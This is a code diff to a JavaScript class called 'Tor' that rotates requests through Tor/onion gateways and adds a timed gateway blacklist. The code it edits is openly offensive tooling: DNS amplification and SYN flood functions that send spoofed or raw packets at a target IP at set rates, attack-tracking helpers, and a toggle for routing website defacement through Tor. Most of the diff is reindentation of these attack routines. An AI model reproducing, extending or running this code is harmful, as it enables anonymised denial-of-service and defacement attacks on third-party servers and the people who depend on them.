@@ -1,4 +1,4 @@
-class Tor { //
+class Tor {
     constructor() {
         this.gateways = [
             "https://onion.city",
@@ -76,6 +76,7 @@ class Tor { //
         this.targetURL = null;
         this.attackConfig = {};
         this.ddosThreads = [];
+        this.gatewayBlacklistDuration = 60000; // 1 minute
     }
 
     async initServerInfo() {
@@ -96,11 +97,11 @@ class Tor { //
     }
 
     getRequestStats() {
-      const now = Date.now();
-      let duration = 0;
-      if (this.attackStartTime) {
-          duration = now - this.attackStartTime;
-      }
+        const now = Date.now();
+        let duration = 0;
+        if (this.attackStartTime) {
+            duration = now - this.attackStartTime;
+        }
 
         let mbpsSent = 0;
         if (duration > 0) {
@@ -166,10 +167,10 @@ class Tor { //
             }
             const { url, options, resolve, reject } = this.requestQueue.shift();
             try {
-              const response = await this.executeTorRequest(url, options);
-              resolve(response);
+                const response = await this.executeTorRequest(url, options);
+                resolve(response);
             } catch (error) {
-              reject(error);
+                reject(error);
             }
         }
 
@@ -206,129 +207,134 @@ class Tor { //
 
             return response.ok;
         } catch (error) {
-            this.failedGateways.add(gateway);
+            this.blacklistGateway(gateway);
             this.log(`Gateway ${gateway} check failed: ${error}`, 'warn');
             return false;
         }
     }
 
+    blacklistGateway(gateway) {
+        this.failedGateways.add(gateway);
+        setTimeout(() => {
+            this.failedGateways.delete(gateway);
+            this.log(`Gateway ${gateway} removed from blacklist.`, 'info');
+        }, this.gatewayBlacklistDuration);
+    }
+
     async startGatewayMonitoring() {
         setInterval(async () => {
             for (const gateway of this.gateways) {
-                const isFailed = this.failedGateways.has(gateway);
-                const isOnline = await this.isGatewayOnline(gateway);
-
-                if (isOnline && isFailed) {
-                    this.failedGateways.delete(gateway);
-                    this.log(`Gateway ${gateway} is back online.`, 'info');
-                } else if (!isOnline && !isFailed) {
-                    this.failedGateways.add(gateway);
-                    this.log(`Gateway ${gateway} is offline. Adding to blacklist.`, 'warn');
+                if (!this.failedGateways.has(gateway)) {
+                    const isOnline = await this.isGatewayOnline(gateway);
+                    if (!isOnline) {
+                        this.log(`Gateway ${gateway} is offline. Adding to blacklist.`, 'warn');
+                    }
                 }
             }
         }, this.gatewayCheckInterval);
     }
 
+
     async executeTorRequest(url, options = {}, retryCount = 0) {
-      if (this.failedGateways.size === this.gateways.length) {
-        const errorMessage = "All Tor gateways are unavailable.";
-        this.log(errorMessage, 'error');
-        this.requestStats.failed++;
-        throw new Error(errorMessage);
-      }
-
-      let gateway = this.gateways[this.currentIndex];
-      let attempts = 0;
-      while (this.failedGateways.has(gateway) && attempts < this.gateways.length) {
-        this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
-        gateway = this.gateways[this.currentIndex];
-        attempts++;
-      }
-
-      if (this.failedGateways.has(gateway)) {
-        const errorMessage = "No available Tor gateways.";
-        this.log(errorMessage, 'error');
-        this.requestStats.failed++;
-        throw new Error(errorMessage);
-      }
-
-      this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
-      let torURL = `${gateway}/${url}`;
-
-      if (this.bypassCache) {
-        torURL += (url.includes('?') ? '&' : '?') + `cacheBuster=${Date.now()}`;
-      }
-
-      try {
-        const controller = new AbortController();
-        const timeoutId = setTimeout(() => controller.abort(), this.requestTimeout);
-        const allHeaders = { ...options.headers, 'User-Agent': this.userAgent, ...this.customHeaders };
-        const response = await fetch(torURL, { ...options, signal: controller.signal, headers: allHeaders });
-        clearTimeout(timeoutId);
-
-        if (!response.ok) {
-          this.failedGateways.add(gateway);
-          this.log(`Gateway ${gateway} failed. Adding to blacklist.`, 'warn');
-          this.requestStats.failed++;
-          this.errorCount++;
-
-          if (this.errorCount > this.errorThreshold) {
-            await new Promise(resolve => setTimeout(resolve, this.rateLimitDelay));
-            this.errorCount = 0;
-          }
-
-          if (retryCount < this.maxRetries) {
-            this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
-            return this.executeTorRequest(url, options, retryCount + 1);
-          } else {
-            const errorMessage = `HTTP error! status: ${response.status} - Max retries reached.`;
+        if (this.failedGateways.size === this.gateways.length) {
+            const errorMessage = "All Tor gateways are unavailable.";
             this.log(errorMessage, 'error');
+            this.requestStats.failed++;
             throw new Error(errorMessage);
-          }
         }
 
-        const responseBytes = await this.getResponseBytes(response);
-        this.requestStats.success++;
-        this.requestStats.bytesReceived += responseBytes;
-        this.log(`Request successful: ${url} - ${responseBytes} bytes`, 'info');
-        return response;
-
-      } catch (error) {
-        this.failedGateways.add(gateway);
-        this.log(`Tor fetch error with gateway ${gateway}: ${error}`, 'error');
-        this.requestStats.failed++;
-        this.errorCount++;
-
-        if (this.errorCount > this.errorThreshold) {
-          await new Promise(resolve => setTimeout(resolve, this.rateLimitDelay));
-          this.errorCount = 0;
+        let gateway = this.gateways[this.currentIndex];
+        let attempts = 0;
+        while (this.failedGateways.has(gateway) && attempts < this.gateways.length) {
+            this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
+            gateway = this.gateways[this.currentIndex];
+            attempts++;
         }
 
-        if (retryCount < this.maxRetries) {
-          this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
-          return this.executeTorRequest(url, options, retryCount + 1);
-        } else {
-          const finalErrorMessage = "Max retries reached. Marking URL as potentially unreachable.";
-          this.log(finalErrorMessage, 'error');
-          throw error;
+        if (this.failedGateways.has(gateway)) {
+            const errorMessage = "No available Tor gateways.";
+            this.log(errorMessage, 'error');
+            this.requestStats.failed++;
+            throw new Error(errorMessage);
         }
-      }
+
+        this.currentIndex = (this.currentIndex + 1) % this.gateways.length;
+        let torURL = `${gateway}/${url}`;
+
+        if (this.bypassCache) {
+            torURL += (url.includes('?') ? '&' : '?') + `cacheBuster=${Date.now()}`;
+        }
+
+        try {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), this.requestTimeout);
+            const allHeaders = { ...options.headers, 'User-Agent': this.userAgent, ...this.customHeaders };
+            const response = await fetch(torURL, { ...options, signal: controller.signal, headers: allHeaders });
+            clearTimeout(timeoutId);
+
+            if (!response.ok) {
+                this.blacklistGateway(gateway);
+                this.log(`Gateway ${gateway} failed. Adding to blacklist.`, 'warn');
+                this.requestStats.failed++;
+                this.errorCount++;
+
+                if (this.errorCount > this.errorThreshold) {
+                    await new Promise(resolve => setTimeout(resolve, this.rateLimitDelay));
+                    this.errorCount = 0;
+                }
+
+                if (retryCount < this.maxRetries) {
+                    this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
+                    return this.executeTorRequest(url, options, retryCount + 1);
+                } else {
+                    const errorMessage = `HTTP error! status: ${response.status} - Max retries reached.`;
+                    this.log(errorMessage, 'error');
+                    throw new Error(errorMessage);
+                }
+            }
+
+            const responseBytes = await this.getResponseBytes(response);
+            this.requestStats.success++;
+            this.requestStats.bytesReceived += responseBytes;
+            this.log(`Request successful: ${url} - ${responseBytes} bytes`, 'info');
+            return response;
+
+        } catch (error) {
+            this.blacklistGateway(gateway);
+            this.log(`Tor fetch error with gateway ${gateway}: ${error}`, 'error');
+            this.requestStats.failed++;
+            this.errorCount++;
+
+            if (this.errorCount > this.errorThreshold) {
+                await new Promise(resolve => setTimeout(resolve, this.rateLimitDelay));
+                this.errorCount = 0;
+            }
+
+            if (retryCount < this.maxRetries) {
+                this.log(`Retrying with a different gateway. Retry count: ${retryCount + 1}`, 'info');
+                return this.executeTorRequest(url, options, retryCount + 1);
+            } else {
+                const finalErrorMessage = "Max retries reached. Marking URL as potentially unreachable.";
+                this.log(finalErrorMessage, 'error');
+                throw error;
+            }
+        }
     }
 
     async getResponseBytes(response) {
-      try {
-        const reader = response.body.getReader();
-        let totalBytes = 0;
-        while (true) {
-          const { done, value } = await reader.read();
-          if (done) break;
-          totalBytes += value.length;
+        try {
+            const reader = response.body.getReader();
+            let totalBytes = 0;
+            while (true) {
+                const { done, value } = await reader.read();
+                if (done) break;
+                totalBytes += value.length;
+            }
+            return totalBytes;
+        } catch (error) {
+            this.log(`Error reading response body: ${error}`, 'warn');
+            return 0;
         }
-        return totalBytes;
-      } catch (error) {
-        this.log(`Error reading response body: ${error}`, 'warn');
-        return 0;
-      }
     }
 
     fetchWithTor(url, options = {}) {
@@ -709,28 +715,28 @@ class Tor { //
     }
 
     async dnsAmplificationAttack(targetIP, spoofIP, packetsPerSecond = 500, duration = 60) {
-      this.startAttack('DNS Amplification', targetIP, { spoofIP, packetsPerSecond, duration });
+        this.startAttack('DNS Amplification', targetIP, { spoofIP, packetsPerSecond, duration });
 
-      const endTime = Date.now() + (duration * 1000);
-      let packetCount = 0;
+        const endTime = Date.now() + (duration * 1000);
+        let packetCount = 0;
 
-      while (Date.now() < endTime) {
-          for (let i = 0; i < packetsPerSecond; i++) {
-              try {
-                  const dnsQuery = this.createDNSQuery();
-                  const spoofedPacket = this.spoofPacket(dnsQuery, spoofIP, targetIP);
-                  await this.sendPacket(spoofedPacket, targetIP);
-                  packetCount++;
-              } catch (error) {
-                  this.log(`DNS Amplification error: ${error}`, 'error');
-              }
-          }
-          await new Promise(resolve => setTimeout(resolve, 1000));
-      }
+        while (Date.now() < endTime) {
+            for (let i = 0; i < packetsPerSecond; i++) {
+                try {
+                    const dnsQuery = this.createDNSQuery();
+                    const spoofedPacket = this.spoofPacket(dnsQuery, spoofIP, targetIP);
+                    await this.sendPacket(spoofedPacket, targetIP);
+                    packetCount++;
+                } catch (error) {
+                    this.log(`DNS Amplification error: ${error}`, 'error');
+                }
+            }
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
 
-      this.endAttack('DNS Amplification', targetIP, { totalPackets: packetCount });
-      console.log(`DNS Amplification attack completed. Total packets sent: ${packetCount}`);
-  }
+        this.endAttack('DNS Amplification', targetIP, { totalPackets: packetCount });
+        console.log(`DNS Amplification attack completed. Total packets sent: ${packetCount}`);
+    }
 
     createDNSQuery() {
         const queryId = Math.floor(Math.random() * 65535);
@@ -776,27 +782,27 @@ class Tor { //
     }
 
     async synFloodAttack(targetIP, targetPort = 80, packetsPerSecond = 1000, duration = 60) {
-      this.startAttack('SYN Flood', targetIP, { targetPort, packetsPerSecond, duration });
+        this.startAttack('SYN Flood', targetIP, { targetPort, packetsPerSecond, duration });
 
-      const endTime = Date.now() + (duration * 1000);
-      let packetCount = 0;
+        const endTime = Date.now() + (duration * 1000);
+        let packetCount = 0;
 
-      while (Date.now() < endTime) {
-          for (let i = 0; i < packetsPerSecond; i++) {
-              try {
-                  const synPacket = this.createSynPacket(targetIP, targetPort);
-                  await this.sendRawPacket(synPacket, targetIP, targetPort);
-                  packetCount++;
-              } catch (error) {
-                  this.log(`SYN Flood error: ${error}`, 'error');
-              }
-          }
-          await new Promise(resolve => setTimeout(resolve, 1000));
-      }
+        while (Date.now() < endTime) {
+            for (let i = 0; i < packetsPerSecond; i++) {
+                try {
+                    const synPacket = this.createSynPacket(targetIP, targetPort);
+                    await this.sendRawPacket(synPacket, targetIP, targetPort);
+                    packetCount++;
+                } catch (error) {
+                    this.log(`SYN Flood error: ${error}`, 'error');
+                }
+            }
+            await new Promise(resolve => setTimeout(resolve, 1000));
+        }
 
-      this.endAttack('SYN Flood', targetIP, { totalPackets: packetCount });
-      console.log(`SYN Flood attack completed. Total packets sent: ${packetCount}`);
-  }
+        this.endAttack('SYN Flood', targetIP, { totalPackets: packetCount });
+        console.log(`SYN Flood attack completed. Total packets sent: ${packetCount}`);
+    }
 
     createSynPacket(targetIP, targetPort) {
         return {
@@ -838,8 +844,8 @@ class Tor { //
     }
 
     setUseTorForDeface(useTor) {
-      this.useTorForDeface = useTor;
-      this.log(`Use Tor for deface set to: ${useTor}`, 'info');
+        this.useTorForDeface = useTor;
+        this.log(`Use Tor for deface set to: ${useTor}`, 'info');
     }
 
     startAttack(attackType, targetURL, config = {}) {
